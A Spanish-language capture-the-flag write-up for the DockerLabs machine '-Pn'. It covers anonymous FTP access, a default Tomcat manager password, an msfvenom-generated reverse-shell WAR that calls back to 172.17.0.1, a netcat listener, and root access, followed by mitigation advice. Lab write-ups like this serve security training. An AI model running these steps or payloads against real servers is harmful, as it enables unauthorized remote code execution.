# Writeup: -Pn

- **Máquina:** -Pn (DockerLabs)
- **Enlace:**[ https://dockerlabs.es/maquinas/292/descargar](https://dockerlabs.es/maquinas/100/descargar)
- **Dificultad:** Fácil
- **Fecha:** 2 de Noviembre 2026

---

## Objetivo
Acceder a privilegios `root` mediante intrusión al servidor y reverse shell.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh pn.tar
```
<img width="516" height="130" alt="Captura de pantalla (305)" src="https://github.com/user-attachments/assets/9da29703-8894-4b95-8420-4a15aae9cea0" />

Para comprobar que el servicio se encuentre activo se usó `ping`:

```bash
$ ping 172.17.0.2
```
Resultado:
```bash
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.098 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.129 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.077 ms
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
```

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando dos puertos abiertos:

```bash
$ nmap -p- -sCV 172.17.0.2 -o scanpn.txt
```

```bash
PORT   STATE SERVICE
21/tcp   open  ftp     vsftpd 3.0.5
8080/tcp open  http    Apache Tomcat 9.0.88
```

--- 

## 2. Identificación de vulnerabilidades
`nmap` también reveló lo siguiente:

```bash
 ftp-anon: Anonymous FTP login allowed (FTP code 230)
_-rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt
```

Esto revela que es posible acceder a FTP de manera anónima y que existe un archivo de texto llamado **tomcat.txt** que puede contener información valiosa.




---
## 3. Explotación
### 1. Conexión FTP
Se realizó el log in FTP:

```bash
$ ftp 172.17.0.2 
```

```bash
Name (172.17.0.2:kali): Anonymous
331 Please specify the password.
Password: (cualquier contraseña es aceptada)
```

<img width="304" height="73" alt="Captura de pantalla (307)" src="https://github.com/user-attachments/assets/d0b6054a-a805-4216-a4b8-f8cb567ed016" />

Una vez logeado, se descargó **tomcat.txt**:

```bash
ftp> get tomcat.txt
```

<img width="1340" height="99" alt="Captura de pantalla (308)" src="https://github.com/user-attachments/assets/9d32b39c-13c7-4493-a047-711c0f2533d5" />

Al leer el archivo, conseguimos en nombre de un usuario válido: **tomcat**

```bash
$ cat tomcat.txt  
```

```bash
Hello tomcat, can you configure the tomcat server? I lost the password...
```


### 2. Enumeración web 
Se verificaron los directorios con `gobuster`:

```bash
$ gobuster dir -u http://172.17.0.2:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="731" height="288" alt="Captura de pantalla (309)" src="https://github.com/user-attachments/assets/3cf556e0-bb0d-4257-b684-08cc2581c873" />


> El directorio /manager/html es especialmente sensible. Permite subir WAR, lo que puede dar lugar a la ejecución de código y reverse shell.

El servidor pide usuario y contraseña para acceder a la ruta **/manager/**. [Hactrick](https://hacktricks.wiki/es/network-services-pentesting/pentesting-web/tomcat/index.html) y [Hackviser](https://hackviser.com/tactics/pentesting/services/tomcat#default-credentials) contienen información sobre algunas credenciales comunes de Tomcat. 

Utilizando la contraseña **s3cr3t**, se pudo acceder a la ruta **/manager/**:

<img width="1366" height="468" alt="Captura de pantalla (311)" src="https://github.com/user-attachments/assets/cc1596bf-36d6-4fc0-877a-267b79ff8ad8" />

### 3. WAR deploy 

Con el siguiente comando se crea archivo `.war` que ejecutara un reverse shell utilizando `msfvenom` de metasploit:

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=9999 -f war > reverse.war
```

Una vez obtenido el `.war`, se desplegó al servidor y se dejó a `netcat` escuchando en el puerto correspondiente:

```bash
$ nc -nvlp 9999  
listening on [any] 9999 ...
```

<img width="1229" height="90" alt="Captura de pantalla (313)" src="https://github.com/user-attachments/assets/276afbd3-0e24-4f2f-9c7a-696843cbddae" />

Con hacer click en **/reverse** de la primera columna es suficiente para que se ejecute el `.war` y obtener privilegios `root`:

<img width="464" height="122" alt="Captura de pantalla (312)" src="https://github.com/user-attachments/assets/180d8ab8-5725-40d1-a08d-7acebe347235" />



---
## Acciones de mitigación
- **Deploy de archivos `.war` maliciosos**: gestionar y monitorizar despliegues de WAR no autorizados.
- **Credenciales debiles y por defecto**: cambiar contraseñas por defecto para que sean más robusta y seguras.
- **Login anónimo FTP**: eliminar login anónimo de FTP y archivos que contengan información sensible.
---
